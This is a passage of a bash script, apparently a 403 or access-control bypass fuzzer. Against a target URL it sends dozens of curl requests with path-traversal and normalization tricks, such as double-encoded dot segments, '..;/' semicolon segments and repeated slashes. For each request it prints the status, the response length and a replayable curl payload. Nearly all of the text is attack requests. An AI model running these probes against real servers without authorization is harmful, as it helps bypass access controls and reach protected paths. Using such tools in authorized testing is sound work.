  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252e%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%253b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252e%%%%253b/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%3b/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e%3b//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e%%%%3b//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2e//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%3b/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%3b/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..%2f..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..%%%%2f..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../../..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../..//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.././../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../.;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..//../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..//..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/../;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;%2f..;%2f..;%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;%%%%2f..;%%%%2f..;%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;//..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;/;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/..;/;/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/.;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//..;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//./' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//.;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//.;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///..;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}///..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}///..;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}//;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/;x' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;x/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/;x/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/../;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/..;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/..;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/..;/;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x//..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/x/;/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
